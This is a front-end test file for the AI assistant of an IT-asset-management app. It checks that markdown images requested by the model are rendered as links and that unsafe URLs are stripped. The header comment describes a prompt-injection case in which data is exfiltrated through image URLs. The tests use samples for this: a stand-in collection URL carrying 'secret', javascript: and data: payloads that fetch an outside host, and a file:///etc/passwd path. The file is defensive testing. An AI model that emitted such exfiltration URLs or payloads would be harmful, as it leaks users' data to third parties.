import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import {
  markdownImage,
  safeMarkdownUrl,
} from '@/components/itam/ai/markdown-safety';

/**
 * A field in the register can carry an instruction addressed to the model, so
 * an answer may come back asking for an image whose URL carries what the model
 * just read. Loading it is what sends the data, so an image is never loaded.
 */
describe('the assistant never loads an image the model asked for', () => {
  const Image = markdownImage as (props: {
    readonly src?: string;
    readonly alt?: string;
    readonly title?: string;
  }) => React.ReactElement;

  it('renders a link instead of an image', () => {
    const { container } = render(
      <Image src='https://elsewhere.example/collect?d=secret' alt='chart' />,
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'chart' });
    expect(link).toHaveAttribute(
      'href',
      'https://elsewhere.example/collect?d=secret',
    );
  });

  it('shows the target when the model gave no alt text', () => {
    render(<Image src='https://elsewhere.example/pixel.png' />);
    expect(
      screen.getByRole('link', { name: 'https://elsewhere.example/pixel.png' }),
    ).toBeInTheDocument();
  });

  it('renders no link at all for a target that needs no click', () => {
    const { container } = render(
      // The point of the assertion is that this one is refused.
      // eslint-disable-next-line @eslint-react/dom-no-script-url
      <Image src='javascript:fetch("//elsewhere.example")' alt='x' />,
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toBe('x');
  });
});

describe('safeMarkdownUrl', () => {
  it('keeps what a reader reaches by clicking', () => {
    for (const url of [
      'https://example.com/a',
      'http://example.com/a',
      'mailto:someone@example.com',
      '/main/devices/1',
      './relative',
      '#section',
    ])
      expect(safeMarkdownUrl(url)).toBe(url);
  });

  it('drops everything else', () => {
    for (const url of [
      'javascript:alert(1)',
      'data:text/html,<script>fetch("//elsewhere.example")</script>',
      'file:///etc/passwd',
      '   ',
    ])
      expect(safeMarkdownUrl(url)).toBe('');
  });
});
